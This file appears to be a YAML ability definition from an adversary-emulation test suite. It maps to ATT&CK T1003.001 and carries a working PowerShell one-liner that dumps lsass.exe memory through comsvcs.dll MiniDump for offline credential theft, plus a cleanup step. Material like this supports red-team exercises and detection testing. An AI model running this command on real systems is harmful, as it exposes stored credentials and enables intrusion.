- id: e2f326bb-1eb1-501c-96bd-de4f4f0f355c
  name: Soumaia ART Tests - Dump LSASS.exe Memory using comsvcs.dll
  description: 'The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.


    Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp. (requires elevation)'
  tactic: credential-access
  technique:
    attack_id: T1003.001
    name: 'OS Credential Dumping: LSASS Memory'
  platforms:
    windows:
      psh:
        command: |-
          C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
        cleanup: |-
          Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
